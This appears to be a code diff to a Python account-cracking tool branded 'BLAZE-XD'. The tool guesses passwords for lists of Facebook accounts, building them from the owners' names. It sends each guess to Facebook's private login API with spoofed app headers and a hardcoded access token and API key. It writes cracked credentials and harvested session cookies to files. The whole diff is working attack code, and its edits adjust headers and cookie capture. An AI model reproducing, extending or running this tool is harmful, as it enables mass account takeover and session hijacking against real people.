@@ -1013,6 +1013,7 @@ def method():
     def method1(user):
      try:
         global loop,accounts
+      
         r = requests.Session()
         user = user.strip()
         acc, name = user.split("|")
@@ -1020,38 +1021,35 @@ def method():
         try:
             last = name.rsplit(" ")[1]
         except:
-           last = first
+            last = first
         pers = str(int(loop)/int(len(accounts)) * 100)[:4]
         sys.stdout.write('\r \033[1;97m[\033[1;97mBLAZE-XD\033[1;97m]\033[1;97m {}|{} \033[1;92m|{} \033[1;91m|{}       \r'.format(str(loop), str(len(accounts)), str(len(okacc)) ,str(len(cpacc))))
         sys.stdout.flush()
-        for pword in totalpass:              
-            heads = "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36"
-            header = {"Content-Type": "application/x-www-form-accencoded","Host": "x.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
+        for pword in totalpass:
+            heads = "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]"
+            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
             pword = pword.replace("first", first).replace("last", last)
             pword = pword.lower()
             data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
             response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
-      #      print(response.text)
             if 'session_key' in response.text:
                 okacc.append(acc)
-                print('\r\033[1;92m [BLAZE-Ok] '+acc+' | '+pword+'')
-                open('/sdcard/BLAZE-Ok.txt','a').write(f'{acc}|{pword}\n ')
+                print('\r\033[1;92m [BLAZE-Ok] '+acc+' | '+pword+'  ')
+                open('/sdcard/BLAZE-Ok.txt','a').write(f'{acc} | {pword} | {cookies}n')
                 if c=='y':
-                    try:
-                           q = json.loads(response.text)
-                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
-                           ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
-                           cookies = f"sb={ssbb};{ckkk}"
-                    except Exception as e:print(str(e)+' | '+response.text)
-                print(' \033[1;97m'+cookies)
-                open('/sdcard/BLAZE-COOKIE.txt','a').write(f'{acc}|{pword}\n{cookies} ')    
-                
-                break
-            elif 'www.facebook.com' in response.text:
+                 try:  
+                  q = json.loads(response.text)
+                  ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
+                  ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+                  cookies = f"sb={ssbb};{ckkk}"
+                 except Exception as e:print(str(e)+' | '+response.text)
+                 print('\r\033[1;95m[\033[1;97mCookie\033[1;93m] \033[1;97m'+cookies)                
+                 break
+            elif 'checkpoint' in response.text:
                 if cpok=='n':
                      pass
                 else:
-                     print('\r\033[1;97m [BLAZE-CP] '+acc+'| '+pword+'')
+                     print('\r\033[1;97m [BLAZE-CP] '+acc+' | '+pword)
                 cpacc.append(acc)
                 open('/sdcard/BLAZE-CP.txt','a').write(f'{acc} • {pword}\n')
                 break
@@ -1086,8 +1084,8 @@ def method():
             response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
             if 'session_key' in response.text:
                 okacc.append(acc)
-                print('\r\033[1;92m [BLAZE-Ok] '+acc+'| '+pword+'  ')
-                open('/sdcard/BLAZE-Ok.txt','a').write(f'{acc} • {pword}\n')
+                print('\r\033[1;92m [BLAZE-Ok] '+acc+' | '+pword+'  ')
+                open('/sdcard/BLAZE-cookie-Ok.txt','a').write(f'{acc} | {pword} | {cookies}\n')
                 if c=='y':
                  try:  
                   q = json.loads(response.text)
@@ -1101,9 +1099,9 @@ def method():
                 if cpok=='n':
                      pass
                 else:
-                     print('\r\033[1;97m [BLAZE-CP] '+acc+'| '+pword)
+                     print('\r\033[1;97m [BLAZE-CP] '+acc+' | '+pword)
                 cpacc.append(acc)
-                open('/sdcard/BLAZE-CP.txt','a').write(f'{acc} • {pword}\n')
+                open('/sdcard/BLAZE-CP.txt','a').write(f'{acc} | {pword}  \n')
                 break
             else:
                 continue
